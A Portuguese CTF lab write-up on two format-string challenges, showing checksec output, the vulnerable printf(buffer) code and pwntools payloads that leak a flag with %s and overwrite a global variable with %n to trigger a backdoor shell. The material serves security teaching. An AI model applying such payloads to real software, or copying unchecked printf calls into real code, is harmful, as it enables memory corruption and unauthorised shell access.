# CTF Semana #5 (Format string)

## Desafio 1

### Recolha de informação

Começamos por analisar os ficheiros disponibilizados na plataforma CTF: um executável (`program`), o código fonte (`main.c`) e um script em python (`exploit_example.py`).

De seguida, corremos o comando `checksec program`, onde obtivemos o seguinte output:

```bash
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

Ao analisar apercebemo-nos que:
- a arquitetura do ficheiro é x86 (Arch)
- existe um canário a proteger o return address (Stack)
- a stack não tem permisssão de execução (NX)
- as posições do binário não estão randomizadas (PIE)

### Reconhecimento da vulnerabilidade

No `main.c`, verificamos que a funcão `scanf` guarda o input introduzido pelo utilizador num buffer local de 32 bytes, sendo impresso por um `printf` sem argumentos adicionais.

```c
scanf("%32s", &buffer);
printf("You gave me this: ");
printf(buffer);
```

Assim sendo, concluimos que podemos explorar as vulnerabilidades associadas ao format string se o nosso input tiver format specifiers.


### Exploração da vulnerabilidade

Primeiramente, recorremos ao `gdb` para descobrir o endereço de memória da variável onde se encontra a flag:

<img src="../screenshots/ctf7/d1_flag.PNG" alt="flag">

No `exploit-example.py`, que interage com o serviço, mudamos a seguinte linha de código para que injetasse o endereço de memória da flag e que desse print `%s`:

```py
p.recvuntil(b"got:")
p.sendline(b"\x60\xC0\x04\x08%s")
p.interactive()
```

Ao executar o script, obtivemos a flag como o esperado:

<img src="../screenshots/ctf7/flag1.PNG" alt="flag">



## Desafio 2

### Recolha de informação

Mais uma vez, começamos por analisar os ficheiros disponibilizados na plataforma CTF: um executável (`program`) e o código fonte (`main.c`) 

De seguida, corremos o comando `checksec program`, onde obtivemos o seguinte output:

```bash
Arch:     i386-32-little
RELRO:    No RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

Ao analisar apercebemo-nos que:
- a arquitetura do ficheiro é x86 (Arch)
- existe um canário a proteger o return address (Stack)
- a stack não tem permisssão de execução (NX)
- as posições do binário não estão randomizadas (PIE)

### Reconhecimento da vulnerabilidade

Tal como no desafio anterior, verificamos que a funcão `scanf` guarda o input introduzido pelo utilizador num buffer local de 32 bytes, sendo impresso por um `printf` sem argumentos adicionais.

```c
scanf("%32s", &buffer);
printf("You gave me this: ");
printf(buffer);
```

Assim sendo, concluimos que podemos explorar as vulnerabilidades associadas ao format string se o nosso input tiver format specifiers, nomeadamente o `%n`, de modo a modificarmos o valor da variável global `key` para `0xbeef` e, consequentemente, lançar uma bash.

```c
if(key == 0xbeef) {
    printf("Backdoor activated\n");
    fflush(stdout);
    system("/bin/bash");    
} 
```

### Exploração da vulnerabilidade

Primeiramente, recorremos ao `gdb` para descobrir o endereço de memória da variável onde se encontra a key:

<img src="../screenshots/ctf7/d2_key.PNG" alt="key">

`0xbeef` tem o valor de **48879** em decimal, pelo que antes de `%n` teremos que escrever 48879 bytes. Sendo que o endereço da variável ocupa 4 bytes, ainda precisamos de 48875 bytes. 

Como o `buffer` apenas tem 32 bytes disponíveis, recorremos à expressão compacta de leitura do printf `%.Nx`, sendo que precisamos de 4 (espaço de 1 endereço) + 48871 bytes:

No `exploit-example.py`, que interage com o serviço, mudamos a seguinte linha de código para que alterasse o valor da `key` na memória:

```py
p.recvuntil(b"here...")
p.sendline(b"AAAA\x24\xB3\x04\x08%.48871x%n")
p.interactive()
```

Ao executar o script, obtivemos a flag como o esperado:

<img src="../screenshots/ctf7/flag2.PNG" alt="flag">


